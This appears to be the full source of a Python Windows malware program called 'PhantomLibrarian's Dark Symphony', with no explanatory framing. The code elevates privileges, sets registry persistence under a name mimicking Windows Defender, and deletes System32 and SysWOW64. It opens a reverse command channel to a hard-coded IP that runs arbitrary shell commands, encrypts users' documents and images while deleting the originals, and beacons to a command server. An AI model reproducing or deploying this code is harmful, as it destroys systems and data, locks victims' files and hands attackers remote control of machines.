# -*- coding: utf-8 -*-
import os
import shutil
import ctypes
import sys
import winreg
from Crypto.Cipher import AES
import socket
import threading
import requests
import subprocess
from datetime import datetime

# PhantomLibrarian's Dark Symphony (v1.42.0)
# -[ ELEVATE PRIVILEGES SILENTLY ]-
if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

# -[ PERSISTENCE MECHANISMS ]-
def haunt_registry():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsDefenderHealth", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except Exception as e:
        pass

# -[ OBLITERATION PROTOCOLS ]-
def nuclear_winter():
    critical_paths = [
        os.path.join(os.environ['WINDIR'], 'System32'),
        os.path.join(os.environ['WINDIR'], 'SysWOW64'),
        os.path.join(os.environ['WINDIR'], 'regedit.exe')
    ]
    
    for path in critical_paths:
        try:
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
            else:
                for _ in range(66):  # Overwrite before deletion
                    with open(path, 'ba+') as f:
                        f.write(os.urandom(4096))
                os.remove(path)
        except:
            pass

# -[ NETWORK VIRULENCE ]-
class ShadowSpread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    
    def run(self):
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(("146.112.62.105", 60001))
                    s.sendall(os.environ['COMPUTERNAME'].encode())
                    while True:
                        cmd = s.recv(4096).decode()
                        if cmd == "activate_judgment":
                            nuclear_winter()
                        else:
                            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
            except:
                pass

# -[ CRYPTO LOCKJAW ]-
def encrypt_ransom(key):
    walk = os.walk(os.path.expanduser("~"))
    for root, _, files in walk:
        for file in files:
            if file.split('.')[-1] in ['docx', 'xlsx', 'pdf', 'jpg']:
                target = os.path.join(root, file)
                with open(target, 'rb') as f:
                    data = f.read()
                cipher = AES.new(key, AES.MODE_EAX)
                ciphertext, tag = cipher.encrypt_and_digest(data)
                with open(target + ".phantom", 'wb') as f:
                    [f.write(x) for x in (cipher.nonce, tag, ciphertext)]
                os.remove(target)

# -[ MAIN OPERATIONS ]-
if __name__ == "__main__":
    haunt_registry()
    ShadowSpread().start()
    encrypt_ransom(os.urandom(16))
    nuclear_winter()
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)  # Prevent termination
    while True:
        requests.post("https://command.phantomlibrarian.net", data={"host": os.environ['COMPUTERNAME']})
